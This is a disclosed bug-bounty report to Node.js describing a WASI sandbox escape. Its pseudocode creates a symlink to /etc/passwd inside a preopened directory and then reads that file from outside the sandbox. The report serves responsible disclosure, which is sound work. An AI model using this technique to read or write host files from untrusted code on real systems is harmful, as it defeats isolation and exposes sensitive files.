# WASI sandbox escape via symlink

## Report Details
- **Report ID**: 2084280
- **URL**: https://hackerone.com/reports/2084280
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2023-07-25T19:48:45.697Z
- **Disclosed**: 2025-05-24T10:33:57.592Z

## Reporter
- **Username**: jessewilson
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs

## Vulnerability Information
**Summary:** A WASI + WASM program can use `path_symlink` to read arbitrary files on the host machine

**Description:** The experimental, off-by-default WASI interface sandboxes local file I/O via ‘preopens’ paths. I can read files outside of this sandbox by creating a symlink in a preopen to a different location on the local file system.

## Steps To Reproduce:

I’m working on a Kotlin/WASM program so I’m going to provide pseudocode:

```
      path_symlink(
        old_path = "/etc/passwd"
        fd = 3,
        new_path = "passwords.txt",
      )
      val fd = path_open(
        fd = 3,
        dirflags = 0,
        path = "passwords.txt",
        oflags = 0,
        fs_rights_base = right_fd_read,
        fs_rights_inheriting = 0,
        fdflags = 0
      )
     val iovs = allocate(8192)
      fd_read(
        fd = fd,
        iovs = iovs.address,
        iovsSize = 1
      )
```

This is based on the Okio WASI integration: https://github.com/square/okio/blob/master/okio-wasifilesystem/src/wasmTest/kotlin/okio/WasiTest.kt

## Impact: Can’t run untrusted code via WASI

## Impact

Reading and writing an arbitrary file off the host file system. Escaping WASI’s sandbox.

## Attachments
No attachments
